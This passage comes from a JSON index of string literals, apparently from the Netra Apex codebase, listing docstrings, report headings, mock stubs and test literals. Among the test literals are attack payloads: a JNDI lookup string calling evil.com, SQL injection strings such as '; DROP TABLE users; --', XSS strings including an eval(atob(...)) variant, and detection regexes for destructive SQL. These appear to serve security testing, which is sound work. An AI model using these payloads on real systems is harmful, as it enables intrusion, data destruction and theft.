        "Create new access token from refresh token with race condition protection.\n        \n        Args:\n            refresh_token: Valid refresh token\n            \n        Returns:\n            New access token or None if invalid/used": {
          "value": "Create new access token from refresh token with race condition protection.\n        \n        Args:\n            refresh_token: Valid refresh token\n            \n        Returns:\n            New access token or None if invalid/used",
          "category": "paths",
          "locations": []
        },
        "Cross-Service Authentication Module\n\nProvides authentication and authorization mechanisms for inter-service communication\nwithin the Netra Apex platform. Handles JWT tokens, service roles, and auth contexts.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Security, Service Communication \n- Value Impact: Enables secure authenticated communication between microservices\n- Strategic Impact: Foundation for zero-trust architecture and service mesh security": {
          "value": "Cross-Service Authentication Module\n\nProvides authentication and authorization mechanisms for inter-service communication\nwithin the Netra Apex platform. Handles JWT tokens, service roles, and auth contexts.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Security, Service Communication \n- Value Impact: Enables secure authenticated communication between microservices\n- Strategic Impact: Foundation for zero-trust architecture and service mesh security",
          "category": "paths",
          "locations": []
        },
        "DELETE\\s+FROM": {
          "value": "DELETE\\s+FROM",
          "category": "paths",
          "locations": []
        },
        "DROP\\s+TABLE": {
          "value": "DROP\\s+TABLE",
          "category": "paths",
          "locations": []
        },
        "Database Module - Compatibility Layer\n\nThis module provides compatibility for imports that expect app.database\nwhile the actual database implementation is in app.db and app.services.database.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform stability (all tiers)\n- Business Goal: Ensure test compatibility and smooth imports\n- Value Impact: Prevents import errors that would break CI/CD pipelines\n- Strategic Impact: Maintains backward compatibility during system evolution": {
          "value": "Database Module - Compatibility Layer\n\nThis module provides compatibility for imports that expect app.database\nwhile the actual database implementation is in app.db and app.services.database.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform stability (all tiers)\n- Business Goal: Ensure test compatibility and smooth imports\n- Value Impact: Prevents import errors that would break CI/CD pipelines\n- Strategic Impact: Maintains backward compatibility during system evolution",
          "category": "paths",
          "locations": []
        },
        "Database engine/bind is None": {
          "value": "Database engine/bind is None",
          "category": "paths",
          "locations": []
        },
        "Database index optimization and management.\n\nThis module provides backward compatibility wrapper for the new modular \ndatabase index optimization system with proper async/await handling.": {
          "value": "Database index optimization and management.\n\nThis module provides backward compatibility wrapper for the new modular \ndatabase index optimization system with proper async/await handling.",
          "category": "paths",
          "locations": []
        },
        "Debug script for reproducing uvicorn recursion errors.\n\nThis script was moved from tests/ to scripts/ to prevent pytest from\ndiscovering it during test collection, which was causing port binding conflicts.\n\nUsage: python scripts/debug_uvicorn_recursion.py": {
          "value": "Debug script for reproducing uvicorn recursion errors.\n\nThis script was moved from tests/ to scripts/ to prevent pytest from\ndiscovering it during test collection, which was causing port binding conflicts.\n\nUsage: python scripts/debug_uvicorn_recursion.py",
          "category": "paths",
          "locations": []
        },
        "Define clear SLAs/SLOs": {
          "value": "Define clear SLAs/SLOs",
          "category": "paths",
          "locations": []
        },
        "Demo script for Real LLM Testing Configuration\n\nThis script demonstrates the enhanced real LLM testing configuration\nthat provides isolated test environments with comprehensive validation.\n\nBusiness Value Justification (BVJ):\n1. Segment: Platform/Internal\n2. Business Goal: Testing Infrastructure Excellence  \n3. Value Impact: Demonstrates reliable AI optimization validation capabilities\n4. Revenue Impact: Enables confident deployment of AI features": {
          "value": "Demo script for Real LLM Testing Configuration\n\nThis script demonstrates the enhanced real LLM testing configuration\nthat provides isolated test environments with comprehensive validation.\n\nBusiness Value Justification (BVJ):\n1. Segment: Platform/Internal\n2. Business Goal: Testing Infrastructure Excellence  \n3. Value Impact: Demonstrates reliable AI optimization validation capabilities\n4. Revenue Impact: Enables confident deployment of AI features",
          "category": "paths",
          "locations": []
        },
        "Demo service backward compatibility module.\n\nDEPRECATED: This file provides backward compatibility imports.\nAll classes have been moved to the demo_service/ module directory\nfor better organization and compliance with the 450-line limit.\n\nNew imports should use:\nfrom netra_backend.app.agents.demo_service import DemoService, DemoTriageService, etc.": {
          "value": "Demo service backward compatibility module.\n\nDEPRECATED: This file provides backward compatibility imports.\nAll classes have been moved to the demo_service/ module directory\nfor better organization and compliance with the 450-line limit.\n\nNew imports should use:\nfrom netra_backend.app.agents.demo_service import DemoService, DemoTriageService, etc.",
          "category": "paths",
          "locations": []
        },
        "Demonstrate CI/CD integration.": {
          "value": "Demonstrate CI/CD integration.",
          "category": "paths",
          "locations": []
        },
        "Dependency Validation Module\nValidates Python/Node.js versions and required dependencies.": {
          "value": "Dependency Validation Module\nValidates Python/Node.js versions and required dependencies.",
          "category": "paths",
          "locations": []
        },
        "Deploy with: python scripts/deploy_to_gcp.py --project": {
          "value": "Deploy with: python scripts/deploy_to_gcp.py --project",
          "category": "paths",
          "locations": []
        },
        "Detect daily/hourly seasonality patterns": {
          "value": "Detect daily/hourly seasonality patterns",
          "category": "paths",
          "locations": []
        },
        "Detect if running in staging/production.\n        \n        Returns:\n            True if running in staging or production environment": {
          "value": "Detect if running in staging/production.\n        \n        Returns:\n            True if running in staging or production environment",
          "category": "paths",
          "locations": []
        },
        "Development mode login endpoint - creates/uses real database user": {
          "value": "Development mode login endpoint - creates/uses real database user",
          "category": "paths",
          "locations": []
        },
        "Disable HTTPS-only mode for sessions (dev/testing)": {
          "value": "Disable HTTPS-only mode for sessions (dev/testing)",
          "category": "paths",
          "locations": []
        },
        "Disable: python scripts/manage_precommit.py disable --reason 'Your reason'": {
          "value": "Disable: python scripts/manage_precommit.py disable --reason 'Your reason'",
          "category": "paths",
          "locations": []
        },
        "Do you want to proceed with deletion? (yes/no):": {
          "value": "Do you want to proceed with deletion? (yes/no):",
          "category": "paths",
          "locations": []
        },
        "Docs: http://localhost:8081/docs": {
          "value": "Docs: http://localhost:8081/docs",
          "category": "paths",
          "locations": []
        },
        "Documentation is available at https://docs.netrasystems.ai/getting-started": {
          "value": "Documentation is available at https://docs.netrasystems.ai/getting-started",
          "category": "paths",
          "locations": []
        },
        "E2E Test Import Verification and Fixing Tool\n\nBusiness Value Justification (BVJ):\n- Segment: Platform\n- Business Goal: Testing Reliability\n- Value Impact: Ensures all e2e tests can load and run properly\n- Strategic Impact: Prevents CI/CD failures and improves test coverage": {
          "value": "E2E Test Import Verification and Fixing Tool\n\nBusiness Value Justification (BVJ):\n- Segment: Platform\n- Business Goal: Testing Reliability\n- Value Impact: Ensures all e2e tests can load and run properly\n- Strategic Impact: Prevents CI/CD failures and improves test coverage",
          "category": "paths",
          "locations": []
        },
        "EMERGENCY: Blocking CI/CD pipeline": {
          "value": "EMERGENCY: Blocking CI/CD pipeline",
          "category": "paths",
          "locations": []
        }
      }
    },
    "states": {
      "count": 7,
      "literals": {
        "active": {
          "value": "active",
          "category": "states",
          "locations": []
        },
        "error": {
          "value": "error",
          "category": "states",
          "locations": []
        },
        "failed": {
          "value": "failed",
          "category": "states",
          "locations": []
        },
        "inactive": {
          "value": "inactive",
          "category": "states",
          "locations": []
        },
        "loading": {
          "value": "loading",
          "category": "states",
          "locations": []
        },
        "pending": {
          "value": "pending",
          "category": "states",
          "locations": []
        },
        "success": {
          "value": "success",
          "category": "states",
          "locations": []
        }
      }
    },
    "test_literals": {
      "count": 6008,
      "literals": {
        "\u001b[0m": {
          "value": "\u001b[0m",
          "category": "test_literals",
          "locations": []
        },
        "\u001b[0m -": {
          "value": "\u001b[0m -",
          "category": "test_literals",
          "locations": []
        },
        "\u001b[91m": {
          "value": "\u001b[91m",
          "category": "test_literals",
          "locations": []
        },
        "\u001b[91mReal E2E Tests:": {
          "value": "\u001b[91mReal E2E Tests:",
          "category": "test_literals",
          "locations": []
        },
        "!!! DANGEROUS MODE ENABLED !!!": {
          "value": "!!! DANGEROUS MODE ENABLED !!!",
          "category": "test_literals",
          "locations": []
        },
        "\"": {
          "value": "\"",
          "category": "test_literals",
          "locations": []
        },
        "\",": {
          "value": "\",",
          "category": "test_literals",
          "locations": []
        },
        "\",\"": {
          "value": "\",\"",
          "category": "test_literals",
          "locations": []
        },
        "#": {
          "value": "#",
          "category": "test_literals",
          "locations": []
        },
        "# ACT Secrets for local testing\nGITHUB_TOKEN=mock_github_token\nGCP_CREDENTIALS={\"type\":\"service_account\"}\nGCP_PROJECT_ID=mock-project\nDOCKER_REGISTRY=localhost:5000\nSTAGING_SSH_KEY=mock_ssh_key\nSTAGING_HOST=localhost\nSTAGING_USER=testuser\nSLACK_WEBHOOK_URL=https://mock.webhook.url": {
          "value": "# ACT Secrets for local testing\nGITHUB_TOKEN=mock_github_token\nGCP_CREDENTIALS={\"type\":\"service_account\"}\nGCP_PROJECT_ID=mock-project\nDOCKER_REGISTRY=localhost:5000\nSTAGING_SSH_KEY=mock_ssh_key\nSTAGING_HOST=localhost\nSTAGING_USER=testuser\nSLACK_WEBHOOK_URL=https://mock.webhook.url",
          "category": "test_literals",
          "locations": []
        },
        "# ACT environment detection - ACT sets this automatically": {
          "value": "# ACT environment detection - ACT sets this automatically",
          "category": "test_literals",
          "locations": []
        },
        "# ACT will override": {
          "value": "# ACT will override",
          "category": "test_literals",
          "locations": []
        },
        "# Add project root to path": {
          "value": "# Add project root to path",
          "category": "test_literals",
          "locations": []
        },
        "# Agent models - creating mocks for tests\nfrom unittest.mock import Mock\nAgent = Mock\nAgentRun = Mock": {
          "value": "# Agent models - creating mocks for tests\nfrom unittest.mock import Mock\nAgent = Mock\nAgentRun = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# AgentRun model - creating mock for tests\nfrom unittest.mock import Mock\nAgentRun = Mock": {
          "value": "# AgentRun model - creating mock for tests\nfrom unittest.mock import Mock\nAgentRun = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# ClickHouseManager - creating mock for tests\nfrom unittest.mock import Mock\nClickHouseManager = Mock": {
          "value": "# ClickHouseManager - creating mock for tests\nfrom unittest.mock import Mock\nClickHouseManager = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# Complexity:": {
          "value": "# Complexity:",
          "category": "test_literals",
          "locations": []
        },
        "# ConversionEvent model - creating mock for tests\nfrom unittest.mock import Mock\nConversionEvent = Mock": {
          "value": "# ConversionEvent model - creating mock for tests\nfrom unittest.mock import Mock\nConversionEvent = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# Critical Path Tests\nclass TestCriticalPaths:\n    \"\"\"Tests for critical execution paths\"\"\"": {
          "value": "# Critical Path Tests\nclass TestCriticalPaths:\n    \"\"\"Tests for critical execution paths\"\"\"",
          "category": "test_literals",
          "locations": []
        },
        "# Database test fixtures - using mocks\nfrom unittest.mock import Mock, AsyncMock\nDatabaseErrorSimulator = Mock\nMockConnectionPool = Mock\nasync_session_mock = AsyncMock\nconnection_pool = Mock\ntransaction_session_mock = AsyncMock": {
          "value": "# Database test fixtures - using mocks\nfrom unittest.mock import Mock, AsyncMock\nDatabaseErrorSimulator = Mock\nMockConnectionPool = Mock\nasync_session_mock = AsyncMock\nconnection_pool = Mock\ntransaction_session_mock = AsyncMock",
          "category": "test_literals",
          "locations": []
        },
        "# FIXME:": {
          "value": "# FIXME:",
          "category": "test_literals",
          "locations": []
        },
        "# Generated from": {
          "value": "# Generated from",
          "category": "test_literals",
          "locations": []
        },
        "# Has return:": {
          "value": "# Has return:",
          "category": "test_literals",
          "locations": []
        },
        "# Incomplete import statement": {
          "value": "# Incomplete import statement",
          "category": "test_literals",
          "locations": []
        },
        "# Message model - creating mock for tests\nfrom unittest.mock import Mock\nMessage = Mock": {
          "value": "# Message model - creating mock for tests\nfrom unittest.mock import Mock\nMessage = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# Mock implementation": {
          "value": "# Mock implementation",
          "category": "test_literals",
          "locations": []
        },
        "# Project Real Test Requirements Violations": {
          "value": "# Project Real Test Requirements Violations",
          "category": "test_literals",
          "locations": []
        },
        "# REDUNDANT TEST - Marked for removal by Autonomous Test Reviewer\\n# Reason: Duplicate coverage or obsolete functionality\\n# Review and remove if confirmed redundant\\n\\n": {
          "value": "# REDUNDANT TEST - Marked for removal by Autonomous Test Reviewer\\n# Reason: Duplicate coverage or obsolete functionality\\n# Review and remove if confirmed redundant\\n\\n",
          "category": "test_literals",
          "locations": []
        },
        "# Real Service Test Report": {
          "value": "# Real Service Test Report",
          "category": "test_literals",
          "locations": []
        },
        "# Real Test Requirements Fix Plan": {
          "value": "# Real Test Requirements Fix Plan",
          "category": "test_literals",
          "locations": []
        },
        "# Real Test Requirements Violations Report": {
          "value": "# Real Test Requirements Violations Report",
          "category": "test_literals",
          "locations": []
        },
        "# Real component behavior: \\1 handles \\2": {
          "value": "# Real component behavior: \\1 handles \\2",
          "category": "test_literals",
          "locations": []
        },
        "# Real component setup: \\1 configured for \\2": {
          "value": "# Real component setup: \\1 configured for \\2",
          "category": "test_literals",
          "locations": []
        },
        "# Run with coverage\n  python unified_test_runner.py --service backend --coverage --min-coverage 80\n  \n  # Run specific test file\n  python unified_test_runner.py --service backend netra_backend/tests/test_main.py\n  \n  # Run tests matching keyword\n  python unified_test_runner.py --service backend -k \"test_login\"\n  \n  # Quick smoke test\n  python unified_test_runner.py --service backend --category smoke --fail-fast\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service backend --coverage --html-output --json-output --parallel auto": {
          "value": "# Run with coverage\n  python unified_test_runner.py --service backend --coverage --min-coverage 80\n  \n  # Run specific test file\n  python unified_test_runner.py --service backend netra_backend/tests/test_main.py\n  \n  # Run tests matching keyword\n  python unified_test_runner.py --service backend -k \"test_login\"\n  \n  # Quick smoke test\n  python unified_test_runner.py --service backend --category smoke --fail-fast\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service backend --coverage --html-output --json-output --parallel auto",
          "category": "test_literals",
          "locations": []
        },
        "# TODO: Implement split test logic": {
          "value": "# TODO: Implement split test logic",
          "category": "test_literals",
          "locations": []
        },
        "# Team model - creating mock for tests\nfrom unittest.mock import Mock\nTeam = Mock": {
          "value": "# Team model - creating mock for tests\nfrom unittest.mock import Mock\nTeam = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# Test Organization Audit Report\n\n## Executive Summary\n\nThe Netra codebase test organization analysis reveals opportunities for improvement in test structure and maintenance.\n\n## Current State Analysis\n\n### 1. Test File Distribution\n- **": {
          "value": "# Test Organization Audit Report\n\n## Executive Summary\n\nThe Netra codebase test organization analysis reveals opportunities for improvement in test structure and maintenance.\n\n## Current State Analysis\n\n### 1. Test File Distribution\n- **",
          "category": "test_literals",
          "locations": []
        },
        "# Test Overlap Analysis Report": {
          "value": "# Test Overlap Analysis Report",
          "category": "test_literals",
          "locations": []
        },
        "# Test Size Compliance Report": {
          "value": "# Test Size Compliance Report",
          "category": "test_literals",
          "locations": []
        },
        "# Test Size Violations Report": {
          "value": "# Test Size Violations Report",
          "category": "test_literals",
          "locations": []
        },
        "# Test implementation": {
          "value": "# Test implementation",
          "category": "test_literals",
          "locations": []
        },
        "# Test stub": {
          "value": "# Test stub",
          "category": "test_literals",
          "locations": []
        },
        "# Thread model - creating mock for tests\nfrom unittest.mock import Mock\nThread = Mock": {
          "value": "# Thread model - creating mock for tests\nfrom unittest.mock import Mock\nThread = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# User journey data - creating mocks\nfrom unittest.mock import Mock\nUserTestData = Mock()\nUserJourneyScenarios = Mock()": {
          "value": "# User journey data - creating mocks\nfrom unittest.mock import Mock\nUserTestData = Mock()\nUserJourneyScenarios = Mock()",
          "category": "test_literals",
          "locations": []
        },
        "# UserFlowTestBase - using unittest.TestCase\nimport unittest\nfrom unittest.mock import Mock\nUserFlowTestBase = unittest.TestCase\nassert_successful_registration = Mock\nassert_plan_compliance = Mock": {
          "value": "# UserFlowTestBase - using unittest.TestCase\nimport unittest\nfrom unittest.mock import Mock\nUserFlowTestBase = unittest.TestCase\nassert_successful_registration = Mock\nassert_plan_compliance = Mock",
          "category": "test_literals",
          "locations": []
        },
        "# Workflow Status Verification Results\n\n## Script Functionality Verification\n\nThe verify_workflow_status.py script has been thoroughly tested and verified to work correctly.\n\n### Key Findings:\n\n1. **Argument Validation**: ✅ WORKING\n   - Properly validates required arguments\n   - Correctly handles invalid argument combinations\n   - Provides clear error messages\n\n2. **Authentication Handling**: ✅ WORKING\n   - Properly checks for GitHub token\n   - Handles missing tokens gracefully\n   - Attempts API calls and handles authentication failures\n\n3. **Error Handling**: ✅ WORKING\n   - Gracefully handles API errors\n   - Provides meaningful error messages\n   - Uses proper exit codes\n\n4. **Output Formatting**: ✅ WORKING\n   - Accepts both table and JSON output formats\n   - Processes arguments correctly\n\n5. **Help System**: ✅ WORKING\n   - Displays comprehensive help text\n   - Shows usage examples\n\n### Test Results:": {
          "value": "# Workflow Status Verification Results\n\n## Script Functionality Verification\n\nThe verify_workflow_status.py script has been thoroughly tested and verified to work correctly.\n\n### Key Findings:\n\n1. **Argument Validation**: ✅ WORKING\n   - Properly validates required arguments\n   - Correctly handles invalid argument combinations\n   - Provides clear error messages\n\n2. **Authentication Handling**: ✅ WORKING\n   - Properly checks for GitHub token\n   - Handles missing tokens gracefully\n   - Attempts API calls and handles authentication failures\n\n3. **Error Handling**: ✅ WORKING\n   - Gracefully handles API errors\n   - Provides meaningful error messages\n   - Uses proper exit codes\n\n4. **Output Formatting**: ✅ WORKING\n   - Accepts both table and JSON output formats\n   - Processes arguments correctly\n\n5. **Help System**: ✅ WORKING\n   - Displays comprehensive help text\n   - Shows usage examples\n\n### Test Results:",
          "category": "test_literals",
          "locations": []
        },
        "# Workflow Status Verification Test Report\n\n## Summary\n- **Total Tests**:": {
          "value": "# Workflow Status Verification Test Report\n\n## Summary\n- **Total Tests**:",
          "category": "test_literals",
          "locations": []
        },
        "##": {
          "value": "##",
          "category": "test_literals",
          "locations": []
        },
        "## Cache Performance": {
          "value": "## Cache Performance",
          "category": "test_literals",
          "locations": []
        },
        "## Category Analysis": {
          "value": "## Category Analysis",
          "category": "test_literals",
          "locations": []
        },
        "## Database Performance": {
          "value": "## Database Performance",
          "category": "test_literals",
          "locations": []
        },
        "## Errors": {
          "value": "## Errors",
          "category": "test_literals",
          "locations": []
        },
        "## Exact Duplicates ⚠️": {
          "value": "## Exact Duplicates ⚠️",
          "category": "test_literals",
          "locations": []
        },
        "## Executive Summary": {
          "value": "## Executive Summary",
          "category": "test_literals",
          "locations": []
        },
        "## File Splits Required": {
          "value": "## File Splits Required",
          "category": "test_literals",
          "locations": []
        },
        "## Function Refactoring Required": {
          "value": "## Function Refactoring Required",
          "category": "test_literals",
          "locations": []
        },
        "## Highly Similar Tests": {
          "value": "## Highly Similar Tests",
          "category": "test_literals",
          "locations": []
        },
        "## Identified Issues\n\n### 1. Configuration Sprawl": {
          "value": "## Identified Issues\n\n### 1. Configuration Sprawl",
          "category": "test_literals",
          "locations": []
        },
        "## Immediate Fixes (Can be automated)": {
          "value": "## Immediate Fixes (Can be automated)",
          "category": "test_literals",
          "locations": []
        },
        "## Impact Analysis": {
          "value": "## Impact Analysis",
          "category": "test_literals",
          "locations": []
        },
        "## LLM API Usage": {
          "value": "## LLM API Usage",
          "category": "test_literals",
          "locations": []
        },
        "## Mock Reduction Required": {
          "value": "## Mock Reduction Required",
          "category": "test_literals",
          "locations": []
        },
        "## Quality Gate Scores": {
          "value": "## Quality Gate Scores",
          "category": "test_literals",
          "locations": []
        },
        "## Recommendations": {
          "value": "## Recommendations",
          "category": "test_literals",
          "locations": []
        },
        "## Recommendations\n\n### Immediate Actions (Priority 1)\n1. **Consolidate Configuration**: Reduce conftest.py files to service-level only\n2. **Standardize Naming**: Use consistent `test_*.py` pattern\n3. **Archive Legacy Tests**: Move or remove legacy test directories\n\n### Short-term Improvements (Priority 2)\n1. **Simplify Test Framework**: Reduce test_framework to essential components\n2. **Unify Test Runners**: Single test runner with clear options\n3. **Clear Test Levels**: Define and document 3-5 clear test levels\n\n### Long-term Goals (Priority 3)\n1. **Test Organization**: Group tests by domain/service\n2. **Performance Optimization**: Implement proper parallel execution\n3. **Documentation**: Single source of truth for test guidelines\n\n## Business Impact\n\n- **Development Velocity**: Test complexity impacts productivity\n- **Maintenance Burden**: Complex structure requires more maintenance\n- **Quality Assurance**: Disorganized tests reduce confidence\n\n## Next Steps\n\n1. Run this audit regularly to track improvements\n2. Prioritize fixes based on development impact\n3. Document decisions in SPEC/learnings/testing.xml": {
          "value": "## Recommendations\n\n### Immediate Actions (Priority 1)\n1. **Consolidate Configuration**: Reduce conftest.py files to service-level only\n2. **Standardize Naming**: Use consistent `test_*.py` pattern\n3. **Archive Legacy Tests**: Move or remove legacy test directories\n\n### Short-term Improvements (Priority 2)\n1. **Simplify Test Framework**: Reduce test_framework to essential components\n2. **Unify Test Runners**: Single test runner with clear options\n3. **Clear Test Levels**: Define and document 3-5 clear test levels\n\n### Long-term Goals (Priority 3)\n1. **Test Organization**: Group tests by domain/service\n2. **Performance Optimization**: Implement proper parallel execution\n3. **Documentation**: Single source of truth for test guidelines\n\n## Business Impact\n\n- **Development Velocity**: Test complexity impacts productivity\n- **Maintenance Burden**: Complex structure requires more maintenance\n- **Quality Assurance**: Disorganized tests reduce confidence\n\n## Next Steps\n\n1. Run this audit regularly to track improvements\n2. Prioritize fixes based on development impact\n3. Document decisions in SPEC/learnings/testing.xml",
          "category": "test_literals",
          "locations": []
        },
        "## Splitting Suggestions": {
          "value": "## Splitting Suggestions",
          "category": "test_literals",
          "locations": []
        },
        "## Summary": {
          "value": "## Summary",
          "category": "test_literals",
          "locations": []
        },
        "## Test Details by Category": {
          "value": "## Test Details by Category",
          "category": "test_literals",
          "locations": []
        },
        "## Test Results Summary": {
          "value": "## Test Results Summary",
          "category": "test_literals",
          "locations": []
        },
        "## Test Validation Status": {
          "value": "## Test Validation Status",
          "category": "test_literals",
          "locations": []
        },
        "## Top 20 Worst Violators": {
          "value": "## Top 20 Worst Violators",
          "category": "test_literals",
          "locations": []
        },
        "## Violations": {
          "value": "## Violations",
          "category": "test_literals",
          "locations": []
        },
        "## Warnings": {
          "value": "## Warnings",
          "category": "test_literals",
          "locations": []
        },
        "## ⚠️ WARNING": {
          "value": "## ⚠️ WARNING",
          "category": "test_literals",
          "locations": []
        },
        "## 🎯 Priority Fix List": {
          "value": "## 🎯 Priority Fix List",
          "category": "test_literals",
          "locations": []
        },
        "## 📋 Violations by Category": {
          "value": "## 📋 Violations by Category",
          "category": "test_literals",
          "locations": []
        },
        "## 🛠️ Recommended Actions": {
          "value": "## 🛠️ Recommended Actions",
          "category": "test_literals",
          "locations": []
        },
        "###": {
          "value": "###",
          "category": "test_literals",
          "locations": []
        },
        "### 2. Test Locations\n\nTop test directories by file count:": {
          "value": "### 2. Test Locations\n\nTop test directories by file count:",
          "category": "test_literals",
          "locations": []
        },
        "### 2. Test Organization": {
          "value": "### 2. Test Organization",
          "category": "test_literals",
          "locations": []
        },
        "### 3. Organizational Patterns\n\n#### 3.1 Test Naming Conventions": {
          "value": "### 3. Organizational Patterns\n\n#### 3.1 Test Naming Conventions",
          "category": "test_literals",
          "locations": []
        },
        "### 4. Key Test Directories": {
          "value": "### 4. Key Test Directories",
          "category": "test_literals",
          "locations": []
        },
        "### File Size Violations": {
          "value": "### File Size Violations",
          "category": "test_literals",
          "locations": []
        },
        "### Function Size Violations": {
          "value": "### Function Size Violations",
          "category": "test_literals",
          "locations": []
        },
        "### Similarity Breakdown": {
          "value": "### Similarity Breakdown",
          "category": "test_literals",
          "locations": []
        },
        "#### 3.2 Test Structure\n- Test directories:": {
          "value": "#### 3.2 Test Structure\n- Test directories:",
          "category": "test_literals",
          "locations": []
        },
        "${jndi:ldap://evil.com/exploit}": {
          "value": "${jndi:ldap://evil.com/exploit}",
          "category": "test_literals",
          "locations": []
        },
        "%": {
          "value": "%",
          "category": "test_literals",
          "locations": []
        },
        "%\n\n## Test Results": {
          "value": "%\n\n## Test Results",
          "category": "test_literals",
          "locations": []
        },
        "% goal": {
          "value": "% goal",
          "category": "test_literals",
          "locations": []
        },
        "% to reach": {
          "value": "% to reach",
          "category": "test_literals",
          "locations": []
        },
        "% to target 85%": {
          "value": "% to target 85%",
          "category": "test_literals",
          "locations": []
        },
        "%(asctime)s - %(levelname)s - %(message)s": {
          "value": "%(asctime)s - %(levelname)s - %(message)s",
          "category": "test_literals",
          "locations": []
        },
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s": {
          "value": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
          "category": "test_literals",
          "locations": []
        },
        "%)": {
          "value": "%)",
          "category": "test_literals",
          "locations": []
        },
        "%)\n\n### Conclusion:\nThe script is **PRODUCTION READY** and properly handles:\n- GitHub API connectivity (when valid token provided)\n- Argument validation and error handling\n- Multiple output formats\n- Workflow status verification\n\nAll \"failures\" in testing are **expected behaviors** when using invalid tokens or non-existent repositories.\nThe script correctly identifies these scenarios and reports appropriate errors.": {
          "value": "%)\n\n### Conclusion:\nThe script is **PRODUCTION READY** and properly handles:\n- GitHub API connectivity (when valid token provided)\n- Argument validation and error handling\n- Multiple output formats\n- Workflow status verification\n\nAll \"failures\" in testing are **expected behaviors** when using invalid tokens or non-existent repositories.\nThe script correctly identifies these scenarios and reports appropriate errors.",
          "category": "test_literals",
          "locations": []
        },
        "%, target: 75%)": {
          "value": "%, target: 75%)",
          "category": "test_literals",
          "locations": []
        },
        "%Y%m%d_%H%M%S": {
          "value": "%Y%m%d_%H%M%S",
          "category": "test_literals",
          "locations": []
        },
        "%Y-%m-%d %H:%M:%S": {
          "value": "%Y-%m-%d %H:%M:%S",
          "category": "test_literals",
          "locations": []
        },
        "&": {
          "value": "&",
          "category": "test_literals",
          "locations": []
        },
        "&state=": {
          "value": "&state=",
          "category": "test_literals",
          "locations": []
        },
        "&state=123456": {
          "value": "&state=123456",
          "category": "test_literals",
          "locations": []
        },
        "&state=invalid_state": {
          "value": "&state=invalid_state",
          "category": "test_literals",
          "locations": []
        },
        "&state=other_session_state": {
          "value": "&state=other_session_state",
          "category": "test_literals",
          "locations": []
        },
        "&state=predictable_state": {
          "value": "&state=predictable_state",
          "category": "test_literals",
          "locations": []
        },
        "&state=reused_state_123": {
          "value": "&state=reused_state_123",
          "category": "test_literals",
          "locations": []
        },
        "'": {
          "value": "'",
          "category": "test_literals",
          "locations": []
        },
        "' (current:": {
          "value": "' (current:",
          "category": "test_literals",
          "locations": []
        },
        "' OR '1'='1": {
          "value": "' OR '1'='1",
          "category": "test_literals",
          "locations": []
        },
        "' UNION SELECT * FROM users --": {
          "value": "' UNION SELECT * FROM users --",
          "category": "test_literals",
          "locations": []
        },
        "' defined in test file": {
          "value": "' defined in test file",
          "category": "test_literals",
          "locations": []
        },
        "' exceeds": {
          "value": "' exceeds",
          "category": "test_literals",
          "locations": []
        },
        "' has": {
          "value": "' has",
          "category": "test_literals",
          "locations": []
        },
        "' has high average complexity (": {
          "value": "' has high average complexity (",
          "category": "test_literals",
          "locations": []
        },
        "' into smaller, focused test functions": {
          "value": "' into smaller, focused test functions",
          "category": "test_literals",
          "locations": []
        },
        "' spans": {
          "value": "' spans",
          "category": "test_literals",
          "locations": []
        },
        "' to a shared fixture or use real components": {
          "value": "' to a shared fixture or use real components",
          "category": "test_literals",
          "locations": []
        },
        "' to a shared test utility module or use real components": {
          "value": "' to a shared test utility module or use real components",
          "category": "test_literals",
          "locations": []
        },
        "'''": {
          "value": "'''",
          "category": "test_literals",
          "locations": []
        },
        "':": {
          "value": "':",
          "category": "test_literals",
          "locations": []
        },
        "'; DROP TABLE users; --": {
          "value": "'; DROP TABLE users; --",
          "category": "test_literals",
          "locations": []
        },
        "'; INSERT INTO users VALUES('hacker','pass'); --": {
          "value": "'; INSERT INTO users VALUES('hacker','pass'); --",
          "category": "test_literals",
          "locations": []
        },
        "'; eval(atob('YWxlcnQoJ1hTUycpOw=='));//": {
          "value": "'; eval(atob('YWxlcnQoJ1hTUycpOw=='));//",
          "category": "test_literals",
          "locations": []
        },
        "';alert('XSS');//": {
          "value": "';alert('XSS');//",
          "category": "test_literals",
          "locations": []
        },
        "(": {
          "value": "(",
          "category": "test_literals",
          "locations": []
        },
        "()": {
          "value": "()",
          "category": "test_literals",
          "locations": []
        },
        "() -": {
          "value": "() -",
          "category": "test_literals",
          "locations": []
        },
        "():": {
          "value": "():",
          "category": "test_literals",
          "locations": []
        },
        "(*args, **kwargs):\n    \"\"\"Create item - test stub implementation.\"\"\"\n    return {\"status\": \"created\", \"id\": \"new_id\"}": {
          "value": "(*args, **kwargs):\n    \"\"\"Create item - test stub implementation.\"\"\"\n    return {\"status\": \"created\", \"id\": \"new_id\"}",
          "category": "test_literals",
          "locations": []
        },
        "(*args, **kwargs):\n    \"\"\"Delete item - test stub implementation.\"\"\"\n    return {\"status\": \"deleted\"}": {
          "value": "(*args, **kwargs):\n    \"\"\"Delete item - test stub implementation.\"\"\"\n    return {\"status\": \"deleted\"}",
          "category": "test_literals",
          "locations": []
        },
        "(*args, **kwargs):\n    \"\"\"Get all items - test stub implementation.\"\"\"\n    return []": {
          "value": "(*args, **kwargs):\n    \"\"\"Get all items - test stub implementation.\"\"\"\n    return []",
          "category": "test_literals",
          "locations": []
        },
        "(*args, **kwargs):\n    \"\"\"Process data - test stub implementation.\"\"\"\n    return {\"status\": \"processed\", \"result\": \"success\"}": {
          "value": "(*args, **kwargs):\n    \"\"\"Process data - test stub implementation.\"\"\"\n    return {\"status\": \"processed\", \"result\": \"success\"}",
          "category": "test_literals",
          "locations": []
        },
        "(*args, **kwargs):\n    \"\"\"Stream data - test stub implementation.\"\"\"\n    for i in range(3):\n        yield f\"Chunk {i+1}\"": {
          "value": "(*args, **kwargs):\n    \"\"\"Stream data - test stub implementation.\"\"\"\n    for i in range(3):\n        yield f\"Chunk {i+1}\"",
          "category": "test_literals",
          "locations": []
        },
